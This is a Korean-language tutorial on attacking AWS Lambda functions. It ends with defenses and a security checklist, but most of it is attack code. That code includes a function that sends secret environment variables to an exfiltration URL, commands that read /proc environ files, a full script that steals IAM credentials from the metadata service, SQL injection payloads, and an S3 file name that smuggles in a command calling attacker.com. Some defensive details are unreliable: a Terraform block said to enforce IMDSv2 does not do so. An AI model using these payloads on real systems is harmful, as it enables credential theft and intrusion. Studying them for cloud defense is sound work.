# AWS Lambda 함수 공격 기법

## 1. 서버리스 위협 모델

서버리스 환경은 인프라 관리 부담을 줄이지만, 실행 컨텍스트·환경 변수·IAM 역할·이벤트 소스에 새로운 공격 표면이 생긴다.

| 공격 벡터 | 설명 |
|-----------|------|
| 환경 변수 탈취 | API 키·DB 자격증명·시크릿 노출 |
| IAM 역할 과다 권한 | Lambda 역할로 다른 AWS 서비스 접근 |
| SSRF → 메타데이터 서비스 | IMDSv1 통해 IAM 임시 자격증명 획득 |
| 의존성 인젝션 | npm/pip 패키지 타이포스쿼팅 |
| 이벤트 인젝션 | 이벤트 소스(SQS·S3·API Gateway)를 통한 인젝션 |
| 타임아웃 공격 | 긴 실행으로 비용·가용성 공격 |
| 콜드 스타트 레이스 | 초기화 로직 타이밍 공격 |

---

## 2. 환경 변수 탈취

Lambda 함수 코드가 RCE 취약점을 가지면 환경 변수를 직접 읽을 수 있다.

```python
# Lambda 내부에서 환경 변수 덤프 (RCE 성공 후)
import os, json, urllib.request

def exfiltrate_env(exfil_url: str) -> None:
    env_vars = dict(os.environ)
    # 자격증명 관련 키 우선 추출
    sensitive = {k: v for k, v in env_vars.items()
                 if any(kw in k.upper() for kw in
                        ["KEY", "SECRET", "TOKEN", "PASS", "DB", "CREDENTIAL"])}
    data = json.dumps(sensitive).encode()
    req = urllib.request.Request(exfil_url, data=data, method="POST")
    urllib.request.urlopen(req, timeout=5)
```

### 2.1 /proc/environ 접근

```bash
# Lambda 런타임에서 /proc/1/environ 읽기 (RCE 전제)
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n' | grep -E "AWS|SECRET|KEY|TOKEN"
```

---

## 3. SSRF → AWS 메타데이터 서비스 (IMDSv1)

```python
#!/usr/bin/env python3
"""Lambda 환경에서 SSRF를 이용한 IAM 자격증명 탈취 시뮬레이터.

실제 Lambda 내부 SSRF 시나리오를 CTF/교육 목적으로 시연.
IMDSv2 (토큰 기반)가 적용된 환경에서는 작동하지 않음.
"""

import argparse
import json
import urllib.request
import urllib.error


METADATA_BASE = "http://169.254.169.254/latest"


def fetch_metadata(path: str, timeout: int = 3) -> str | None:
    try:
        url = f"{METADATA_BASE}/{path}"
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode()
    except (urllib.error.URLError, OSError):
        return None


def get_iam_credentials() -> dict | None:
    role_name = fetch_metadata("meta-data/iam/security-credentials/")
    if not role_name:
        print("[-] IMDSv1 접근 불가 (IMDSv2 적용됨 or 메타데이터 서비스 비활성화)")
        return None

    role_name = role_name.strip()
    print(f"[+] IAM 역할 발견: {role_name}")

    creds_json = fetch_metadata(f"meta-data/iam/security-credentials/{role_name}")
    if not creds_json:
        return None

    creds = json.loads(creds_json)
    return {
        "RoleName": role_name,
        "AccessKeyId": creds.get("AccessKeyId"),
        "SecretAccessKey": creds.get("SecretAccessKey"),
        "Token": creds.get("Token"),
        "Expiration": creds.get("Expiration"),
    }


def check_imdsv2(timeout: int = 3) -> bool:
    """IMDSv2 적용 여부 확인."""
    try:
        req = urllib.request.Request(
            f"{METADATA_BASE}/api/token",
            method="PUT",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            token = resp.read().decode()
            return bool(token)
    except Exception:
        return False


def main() -> None:
    parser = argparse.ArgumentParser(description="AWS 메타데이터 서비스 취약점 진단 (교육용)")
    parser.add_argument("--check-only", action="store_true", help="IMDSv2 적용 여부만 확인")
    parser.add_argument("-o", "--output", help="결과 저장 경로")
    args = parser.parse_args()

    imdsv2 = check_imdsv2()
    print(f"[*] IMDSv2 적용: {'예 (보호됨)' if imdsv2 else '아니오 (취약)'}")

    if args.check_only or imdsv2:
        return

    creds = get_iam_credentials()
    if creds:
        print(f"[+] AccessKeyId: {creds['AccessKeyId']}")
        print(f"[+] 만료: {creds['Expiration']}")
        if args.output:
            with open(args.output, "w") as f:
                json.dump(creds, f, indent=2)
            print(f"결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. Lambda 이벤트 인젝션

### 4.1 API Gateway 이벤트 조작

```python
# API Gateway → Lambda 이벤트 구조 예시
event = {
    "httpMethod": "POST",
    "path": "/api/query",
    "headers": {"Authorization": "Bearer TOKEN"},
    "body": '{"query": "1; DROP TABLE users--"}',  # SQL 인젝션
    "queryStringParameters": {
        "page": "1 UNION SELECT username,password FROM admin--"
    }
}

# 취약한 Lambda 핸들러 (인젝션 취약)
def handler_vulnerable(event, context):
    import sqlite3
    page = event["queryStringParameters"]["page"]
    conn = sqlite3.connect("/tmp/db.sqlite3")
    # 위험: 직접 포맷 — SQLi 취약
    results = conn.execute(f"SELECT * FROM items WHERE id = {page}").fetchall()
    return {"statusCode": 200, "body": str(results)}

# 안전한 핸들러
def handler_safe(event, context):
    import sqlite3
    page = event["queryStringParameters"].get("page", "1")
    if not page.isdigit():
        return {"statusCode": 400, "body": "Invalid page parameter"}
    conn = sqlite3.connect("/tmp/db.sqlite3")
    results = conn.execute("SELECT * FROM items WHERE id = ?", (int(page),)).fetchall()
    return {"statusCode": 200, "body": str(results)}
```

### 4.2 S3 이벤트 트리거 조작

```bash
# S3 이벤트를 통한 Lambda 트리거 조작
# 파일명에 특수문자 삽입 → Lambda에서 처리 시 커맨드 인젝션
aws s3 cp payload.zip "s3://target-bucket/$(curl attacker.com/$(whoami)).zip"

# 대용량 파일로 Lambda 타임아웃 유발 (비용 DoS)
dd if=/dev/zero bs=1M count=500 | aws s3 cp - s3://target-bucket/large-file.bin
```

---

## 5. Lambda 런타임 탐지

```python
#!/usr/bin/env python3
"""Lambda 런타임 환경 정보 수집 — 보안 감사용."""

import os
import json
import platform
import subprocess
from pathlib import Path


def collect_runtime_info() -> dict:
    info: dict = {}

    # Lambda 환경 변수
    lambda_vars = [
        "AWS_REGION", "AWS_DEFAULT_REGION", "AWS_LAMBDA_FUNCTION_NAME",
        "AWS_LAMBDA_FUNCTION_VERSION", "AWS_LAMBDA_FUNCTION_MEMORY_SIZE",
        "AWS_LAMBDA_LOG_GROUP_NAME", "AWS_EXECUTION_ENV",
        "LAMBDA_RUNTIME_DIR", "LAMBDA_TASK_ROOT",
        "_HANDLER", "AWS_LAMBDA_RUNTIME_API",
    ]
    info["lambda_env"] = {k: os.environ.get(k, "N/A") for k in lambda_vars}

    # 시스템 정보
    info["platform"] = {
        "system": platform.system(),
        "machine": platform.machine(),
        "python_version": platform.python_version(),
    }

    # /tmp 쓰기 가능 여부
    try:
        test_file = Path("/tmp/.test")
        test_file.write_text("test")
        test_file.unlink()
        info["tmp_writable"] = True
    except OSError:
        info["tmp_writable"] = False

    # /proc 접근 가능 여부
    info["proc_accessible"] = Path("/proc/self/status").exists()

    # 네트워크 인터페이스
    try:
        result = subprocess.run(
            ["ip", "addr"], capture_output=True, text=True, timeout=5
        )
        info["network"] = result.stdout[:500]
    except Exception:
        info["network"] = "접근 불가"

    return info


def lambda_handler(event: dict, context) -> dict:
    info = collect_runtime_info()
    return {
        "statusCode": 200,
        "body": json.dumps(info, indent=2, ensure_ascii=False),
    }
```

---

## 6. 방어 기법

### 6.1 IMDSv2 강제 적용

```bash
# EC2 인스턴스 메타데이터 서비스 v2 강제 (Lambda는 기본 IMDSv2)
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled

# Terraform으로 Lambda IMDSv2 강제
resource "aws_lambda_function" "secure" {
  # ...
  ephemeral_storage { size = 512 }
}
```

### 6.2 환경 변수 대신 AWS Secrets Manager 사용

```python
import boto3
import json
from functools import cache

@cache
def get_secret(secret_name: str) -> dict:
    client = boto3.client("secretsmanager", region_name="ap-northeast-2")
    response = client.get_secret_value(SecretId=secret_name)
    return json.loads(response["SecretString"])

def lambda_handler(event, context):
    # 환경 변수 대신 Secrets Manager 사용
    db_creds = get_secret("prod/myapp/database")
    db_password = db_creds["password"]
    # ...
```

---

## 7. Lambda 보안 체크리스트

| 항목 | 권장 설정 |
|------|-----------|
| IAM 역할 | 최소 권한 원칙 — 필요한 서비스만 허용 |
| 환경 변수 | KMS 암호화 활성화 |
| 시크릿 | Secrets Manager / Parameter Store 사용 |
| VPC | 민감 리소스 접근 시 VPC 내 배치 |
| IMDSv2 | 항상 강제 적용 |
| 타임아웃 | 적절한 제한 설정 (기본 3초, 최대 15분) |
| 동시성 | Reserved Concurrency로 DoS 방지 |
| 레이어 | 레이어 권한 최소화 |
| 코드 서명 | Code Signing Config 적용 |
| 감사 로그 | CloudTrail + CloudWatch Logs 활성화 |
